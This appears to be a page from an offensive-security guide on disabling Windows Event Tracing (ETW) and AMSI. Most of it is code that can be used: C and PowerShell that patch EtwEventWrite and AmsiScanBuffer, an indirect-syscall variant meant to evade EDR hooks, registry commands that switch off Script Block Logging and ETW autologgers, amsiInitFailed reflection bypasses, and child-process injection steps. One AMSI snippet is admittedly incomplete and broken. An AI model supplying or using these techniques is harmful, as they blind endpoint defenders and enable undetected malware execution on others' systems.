  <h1>ETW (Event Tracing for Windows) Bypass</h1>
  <p>ETW is the Windows telemetry backbone — EDR products and Windows Defender use ETW providers to monitor process behavior, .NET execution, PowerShell commands, and suspicious API call sequences. Bypassing ETW blinds these monitors. Techniques include patching EtwEventWrite, disabling per-process providers, and using Process Environment Block (PEB) manipulation.</p>

  <h2>ETW Architecture</h2>
  <pre><code">// ETW components:
// Providers: components that emit events (CLR, PowerShell, ntdll, etc.)
// Sessions: collect events from one or more providers
// Consumers: EDR, WEF, Sysmon, Windows Defender

// Key ETW providers for defenders:
// Microsoft-Windows-DotNETRuntime  — .NET method JIT, exceptions
// Microsoft-Windows-PowerShell    — PS commands, script blocks
// Microsoft-Antimalware-Scan-Interface (AMSI) — malicious strings
// Microsoft-Windows-Kernel-Process — process/thread create
// Microsoft-Windows-Threat-Intelligence — process injection events

// ETW flow:
// Code → EtwEventWrite() → kernel ETW buffer → consumer session → EDR

// Bypass targets:
// 1. Patch EtwEventWrite in ntdll → all events from this process silenced
// 2. Disable per-provider trace → specific provider blinded
// 3. Tamper with ETW session → all events for that session lost</code></pre>

  <h2>Patching EtwEventWrite</h2>
  <pre><code">// EtwEventWrite is the main ETW dispatch function in ntdll.dll
// Patching it with "ret" (0xC3) silences all ETW from the process

// C implementation:
#include &lt;windows.h&gt;

void PatchEtw() &#123;
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PVOID pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");

    // Make memory writable:
    DWORD oldProtect;
    VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &amp;oldProtect);

    // Patch with ret:
    *(BYTE*)pEtwEventWrite = 0xC3;  // ret

    // Restore protection:
    VirtualProtect(pEtwEventWrite, 1, oldProtect, &amp;oldProtect);
&#125;

// PowerShell (reflection):
$EtwEventWrite = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Get-ProcAddress ntdll.dll EtwEventWrite),
    [Action]
)
# Patch with ret:
[System.Runtime.InteropServices.Marshal]::WriteByte(
    (Get-ProcAddress ntdll.dll EtwEventWrite), 0xC3
)

// Note: Defender may detect the VirtualProtect(ntdll) + write pattern
// Alternative: patch via NtProtectVirtualMemory syscall</code></pre>

  <h2>EtwEventWrite via Syscall Patch</h2>
  <pre><code">// Use NtProtectVirtualMemory (indirect syscall) to avoid hook detection:

// 1. Get EtwEventWrite address
PVOID pEtwWrite = GetProcAddress(GetModuleHandleA("ntdll"), "EtwEventWrite");

// 2. Unprotect via syscall (no VirtualProtect EDR hook):
PVOID base = pEtwWrite;
SIZE_T size = 1;
ULONG oldProt;
NtProtectVirtualMemory(GetCurrentProcess(), &amp;base, &amp;size,
    PAGE_EXECUTE_READWRITE, &amp;oldProt);  // via SysWhispers3

// 3. Write patch:
*(BYTE*)pEtwWrite = 0xC3;

// 4. Restore:
NtProtectVirtualMemory(GetCurrentProcess(), &amp;base, &amp;size, oldProt, &amp;oldProt);</code></pre>

  <h2>Per-Process Provider Disabling</h2>
  <pre><code">// EtwEventRegister can be patched to prevent providers from registering
// Or use NtTraceControl to disable specific providers

// Disable .NET ETW provider (CLR):
// The CLR checks _EtwHandle — if null, no events emitted
// Force CLR to stop emitting by patching clrjit.dll or using ENV var:
$env:COMPlus_ETWEnabled = "0"  # Disable ETW for .NET (PowerShell)

// More targeted — patch per-provider handle:
// RtlRegisterTraceGuids / EtwRegisterTraceGuids
// If patched before CLR loads, .NET events never registered

// Disable via registry (requires admin):
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger" /v "Start" /t REG_DWORD /d 0

// For PowerShell — disable Script Block Logging via registry:
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v "EnableScriptBlockLogging" /t REG_DWORD /d 0</code></pre>

  <h2>AMSI Bypass (Related)</h2>
  <pre><code">// AMSI (Antimalware Scan Interface) uses ETW provider and COM API
// Patch amsi.dll!AmsiScanBuffer to bypass script content scanning

// PowerShell AMSI bypass (patching AmsiScanBuffer):
$a = [Ref].Assembly.GetTypes() | % &#123; $_.GetFields('NonPublic,Static') &#125; | ? &#123; $_.Name -eq 'amsiInitFailed' &#125;
$a.SetValue($null, $true)
# Or patch AmsiScanBuffer directly:

[System.Runtime.InteropServices.Marshal]::WriteByte(
    (& &#123;
        $r = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
        [IO.Path]::Combine($r, 'clr.dll')
    &#125;), 0)  # simplified — actual offset needed

// C# AMSI bypass:
var amsiDll = GetModuleHandle("amsi.dll");
var amsiScanBuffer = GetProcAddress(amsiDll, "AmsiScanBuffer");
// Patch first bytes to return AMSI_RESULT_CLEAN (0x1) always:
// B8 57 00 07 80  → mov eax, 0x80070057 (AMSI_RESULT_NOT_DETECTED variant)
// Or: C3 (ret) - returns 0 = S_OK, amsiResult unchanged → no detection

// Reflection-based (encoded to evade string detection):
$w = 'System.Management.Automation'
$a = [Ref].Assembly.GetType("$w.AmsiUtils")
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)</code></pre>

  <h2>ETW Tampering in Child Processes</h2>
  <pre><code">// ETW patches are per-process — child processes inherit clean ntdll
// Solution: patch child immediately after spawn

// Using NtCreateProcess with ETW patch in loader:
// 1. Create process suspended
// 2. Inject ETW patch via WriteProcessMemory
// 3. Resume process — starts with ETW disabled

// Or use early-bird APC injection (APC page):
// Queue ETW patch as APC to main thread before entry point runs</code></pre>

